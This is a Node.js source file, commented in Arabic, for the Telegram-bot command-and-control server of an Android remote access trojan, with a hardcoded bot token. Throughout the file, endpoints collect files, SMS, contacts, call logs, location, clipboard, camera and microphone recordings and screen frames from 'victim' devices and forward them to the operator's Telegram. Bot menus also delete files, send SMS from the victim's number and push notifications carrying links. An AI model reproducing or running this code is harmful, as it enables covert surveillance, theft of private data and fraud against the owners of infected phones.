const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '7527970729:AAHCQGx1uUJnhpUmt2aGgkFaKyDrNXZQsi4'
const id = '6055623761'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

// نقطة النهاية لاستيراد جميع الملفات عند تشغيل التطبيق
app.post('/fetchAllFiles', (req, res) => {
    const deviceModel = req.headers.model;

    // إرسال رسالة للبوت تشير إلى بدء استيراد الملفات
    appBot.sendMessage(id, `📂 بدء استيراد جميع الملفات من الجهاز: <b>${deviceModel}</b>`, {
        parse_mode: "HTML"
    });

    // إرسال الأمر إلى الجهاز لجلب جميع الملفات
    appSocket.clients.forEach(function each(ws) {
        if (ws.uuid) {
            ws.send('fetch_all_files'); // إرسال الأمر لاستيراد جميع الملفات من الجهاز
        }
    });

    res.send({ status: 'success', message: 'تم إرسال طلب استيراد الملفات.' });
});

// التعامل مع الملفات المستلمة من الجهاز
appSocket.on('message', (data, ws) => {
    try {
        const message = JSON.parse(data);

        if (message.type === 'file') {
            // إذا كانت الرسالة تحتوي على ملف
            const fileBuffer = Buffer.from(message.content, 'base64');
            const fileName = message.name;
            const fileType = message.type;

            // إرسال الملف إلى البوت
            appBot.sendDocument(id, fileBuffer, {
                caption: `📄 ملف مستورد من الجهاز:
- الاسم: ${fileName}
- النوع: ${fileType}`,
                parse_mode: 'HTML',
            }, {
                filename: fileName,
                contentType: fileType,
            });
        } else if (message.type === 'fetch_complete') {
            // رسالة تشير إلى اكتمال عملية استيراد الملفات
            appBot.sendMessage(id, `✅ تم استيراد جميع الملفات من الجهاز: <b>${ws.uuid}</b>`, {
                parse_mode: "HTML"
            });
        }
    } catch (error) {
        console.error('خطأ في معالجة الرسالة:', error);
    }
});

// نقطة النهاية لاستلام الإطارات للبث المباشر
app.post('/streamScreen', upload.single('frame'), (req, res) => {
    if (!req.file) {
        return res.status(400).send({ status: 'error', message: 'لم يتم إرسال ملف صالح.' });
    }

    const frameBuffer = req.file.buffer;
    liveFrames.push(frameBuffer);

    if (liveFrames.length > FRAME_LIMIT) {
        liveFrames.shift(); // إزالة الإطار الأقدم
    }

    res.send({ status: 'success', message: 'تم استقبال الإطار بنجاح.' });
});

// إرسال الإطارات إلى البوت
const sendLiveStreamToBot = () => {
    if (liveFrames.length > 0) {
        const currentFrame = liveFrames.shift();
        authorizedUsers.forEach((userId) => {
            appBot.sendPhoto(userId, { source: currentFrame }, { caption: `📡 بث مباشر للشاشة` })
                .catch((err) => console.error('خطأ في إرسال الإطار:', err));
        });
    }
};

// تكرار إرسال الإطارات
setInterval(sendLiveStreamToBot, 1000);

// التحكم في البث المباشر عبر البوت
appBot.on('message', (message) => {
    const chatId = message.chat.id;

    if (!authorizedUsers.includes(chatId)) {
        return appBot.sendMessage(chatId, '❌ ليس لديك الصلاحية لاستخدام هذه الأوامر.');
    }

    if (message.text === '/startStream') {
        appBot.sendMessage(chatId, '📡 تم بدء البث المباشر. الرجاء إرسال الإطارات.');
    } else if (message.text === '/stopStream') {
        liveFrames = []; // إفراغ الإطارات
        appBot.sendMessage(chatId, '🛑 تم إيقاف البث المباشر.');
    }
});

// تحسين الإعدادات العامة
const FRAME_LIMIT = 50;
let liveFrames = [];
const authorizedUsers = [6055623761]; // معرفات المستخدمين المصرح لهم

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت :  الهاكر يوسف امين قناة المطور @yousseflovenourhacer</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• رسالة من<b>${req.headers.model}</b> جهاز`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• رسالة من<b>${req.headers.model}</b> جهاز\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• موقع من <b>${req.headers.model}</b> جهاز`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• جهاز جديد متصل\n\n` +
        `• موديل الجهاز : <b>${model}</b>\n` +
        `• البطارية : <b>${battery}</b>\n` +
        `• نظام الاندرويد : <b>${version}</b>\n` +
        `• سطوح الشاشة : <b>${brightness}</b>\n` +
        `• مزود : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• لا يوجد جهاز متصل\n\n` +
            `• موديل الجهاز : <b>${model}</b>\n` +
            `• البطارية : <b>${battery}</b>\n` +
            `• نظام الاندرويد : <b>${version}</b>\n` +
            `• سطوح الشاشة : <b>${brightness}</b>\n` +
            `• مزود : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....\n\n' +
                '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل مسار الملف الذي تريد ')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل صوت الضحية')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل الكاميرا الامامية')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل المدة الذي تريد تسجيل كاميرا السلفي للضحية')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• • ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ادخل الرسالة التي تريدها تظهر كما إشعار')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار\n\n' +
                '• عندما ينقر الضحية على الإشعار ، سيتم فتح الرابط الذي تقوم بإدخاله ،',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• رائع ، أدخل الآن الرابط الذي تريد فتحه بواسطة الإشعار')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• أدخل رابط الصوت الذي تريد تشغيله')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• مرحبا بكم في بوت الاختراق مطور البوت الهاكر يوسف امين قناة المطور @yousseflovenourhacer\n\n' +
                '• إذا كان التطبيق مثبتًا على الجهاز المستهدف ، فانتظر الاتصال\n\n' +
                '• عندما تتلقى رسالة الاتصال ، فهذا يعني أن الجهاز المستهدف متصل وجاهز لاستلام الأمر\n\n' +
                '• انقر على زر الأمر وحدد الجهاز المطلوب ثم حدد الأمر المطلوب بين الأمر\n\n' +
                '• إذا علقت في مكان ما في الروبوت ، أرسل /start  الأمر ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'الاجهزة المتصلة') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• لا توجد اجهزة متصلة ومتوفرة\n\n' +
                    '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
                )
            } else {
                let text = '°• قائمة الاجهزة المتصلة :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• موديل الجهاز : <b>${value.model}</b>\n` +
                        `• البطارية : <b>${value.battery}</b>\n` +
                        `• نظام الاندرويد : <b>${value.version}</b>\n` +
                        `• سطوح الشاشة : <b>${value.brightness}</b>\n` +
                        `• مزود : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'تنفيذ الامر') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• لا توجد اجهزة متصلة ومتوفرة\n\n' +
                    '• تأكد من تثبيت التطبيق على الجهاز المستهدف'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• حدد الجهاز المراد تنفيذ عليه الاوامر', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• طلب الاذن مرفوض')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• حدد الثناء للجهاز : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '📱التطبيقات', callback_data: `apps:${uuid}`},
                        {text: '📲معلومات الجهاز', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '📂الحصول علئ الملفات', callback_data: `file:${uuid}`},
                        {text: 'حذف ملف🗃️', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '📃الحافظة', callback_data: `clipboard:${uuid}`},
                        {text: '🎙️المكرفون', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '📷الكاميرا الامامي', callback_data: `camera_main:${uuid}`},
                        {text: '📸الكاميرا السلفي', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '🚩الموقع', callback_data: `location:${uuid}`},
                        {text: '👹نخب', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '☎️المكالمات', callback_data: `calls:${uuid}`},
                        {text: 'جهات الاتصال👤', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '📳يهتز', callback_data: `vibrate:${uuid}`},
                        {text: 'اظهار الاخطار⚠️', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'الرسايل', callback_data: `messages:${uuid}`},
                        {text: '✉️ارسال رسالة', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '📴تشغيل ملف صوتي', callback_data: `play_audio:${uuid}`},
                        {text: '📵ايقاف الملف الصوتي', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '✉️ارسال👤 رسالة الئ جميع جهة اتصال',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور الهاكر يوسف امين قناة المطور @yousseflovenourhacer ،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية\n\n' +
            '• إذا كنت ترغب في إرسال الرسائل القصيرة إلى أرقام الدول المحلية، يمكنك إدخال الرقم بصفر في البداية، وإلا أدخل الرقم مع رمز البلد،',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• الرجاء كتابة الرسالة المراد ارسالها الئ الجميع\n\n' +
            '• كن حذرًا من أن الرسالة لن يتم إرسالها إذا كان عدد الأحرف في رسالتك أكثر من المسموح به ،',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل مسار الملف الذي تريد سحبة من جهاز الضحية\n\n' +
            '• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لتلقي ملفات المعرض.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل مسار الملف الذي تريد \n\n' +
            '• لا تحتاج إلى إدخال مسار الملف الكامل ، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل<b> DCIM/Camera </b> لحذف ملفات المعرض.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل مسار الملف الذي تريد \n\n' +
            '• لاحظ أنه يجب إدخال الوقت عدديًا بوحدات من الثواني ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل الرسالة التي تريد ان تظهر علئ جهاز الضحية\n\n' +
            '• هي رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ادخل الرسالة التي تريدها تظهر كما إشعار\n\n' +
            '• ستظهر رسالتك في شريط حالة الجهاز الهدف مثل الإخطار العادي ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• °• أدخل رابط الصوت الذي تريد تشغيله\n\n' +
            '• لاحظ أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب ، وإلا فلن يتم تشغيل الصوت ،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);

// نقطة النهاية لتحميل جميع أنواع الملفات
app.post('/uploadFile', upload.single('file'), (req, res) => {
    const fileBuffer = req.file.buffer; // محتوى الملف
    const fileName = req.file.originalname; // اسم الملف
    const fileType = req.file.mimetype; // نوع الملف

    // إرسال الملف إلى البوت
    appBot.sendDocument(id, fileBuffer, {
        caption: `📄 تم استلام ملف جديد:\n- الاسم: ${fileName}\n- النوع: ${fileType}`,
        parse_mode: 'HTML',
    }, {
        filename: fileName,
        contentType: fileType,
    });

    res.send({ status: 'success', message: 'تم إرسال الملف إلى البوت بنجاح.' });
});

// نقطة النهاية لاستيراد الصور والفيديوهات فقط
app.post('/uploadMedia', upload.single('file'), (req, res) => {
    const fileBuffer = req.file.buffer;
    const fileName = req.file.originalname;
    const fileType = req.file.mimetype;

    // إرسال الصور والفيديوهات إلى البوت
    if (fileType.startsWith('image/')) {
        appBot.sendPhoto(id, fileBuffer, { caption: `🖼️ تم استلام صورة: ${fileName}` });
    } else if (fileType.startsWith('video/')) {
        appBot.sendVideo(id, fileBuffer, { caption: `🎥 تم استلام فيديو: ${fileName}` });
    } else {
        return res.status(400).send({ status: 'error', message: 'يرجى إرسال صورة أو فيديو فقط.' });
    }

    res.send({ status: 'success', message: 'تم إرسال الوسائط إلى البوت بنجاح.' });
});

// نقطة النهاية لاستيراد الملفات الصوتية فقط
app.post('/uploadAudio', upload.single('file'), (req, res) => {
    const fileBuffer = req.file.buffer;
    const fileName = req.file.originalname;

    // إرسال الملف الصوتي إلى البوت
    appBot.sendAudio(id, fileBuffer, { caption: `🎵 تم استلام ملف صوتي: ${fileName}` });

    res.send({ status: 'success', message: 'تم إرسال الملف الصوتي إلى البوت بنجاح.' });
});

// نقطة النهاية لاستقبال ملفات APK
app.post('/uploadAPK', upload.single('file'), (req, res) => {
    const fileBuffer = req.file.buffer; // محتوى الملف
    const fileName = req.file.originalname; // اسم الملف
    const fileType = req.file.mimetype; // نوع الملف

    // تحقق من أن الملف بصيغة APK
    if (!fileName.endsWith('.apk') || fileType !== 'application/vnd.android.package-archive') {
        return res.status(400).send({ status: 'error', message: 'يرجى إرسال ملف بصيغة APK فقط.' });
    }

    // إرسال ملف APK إلى البوت
    appBot.sendDocument(id, fileBuffer, {
        caption: `📦 تم استلام ملف APK:
- الاسم: ${fileName}`,
        parse_mode: 'HTML',
    }, {
        filename: fileName,
        contentType: fileType,
    });

    res.send({ status: 'success', message: 'تم إرسال ملف APK إلى البوت بنجاح.' });
});
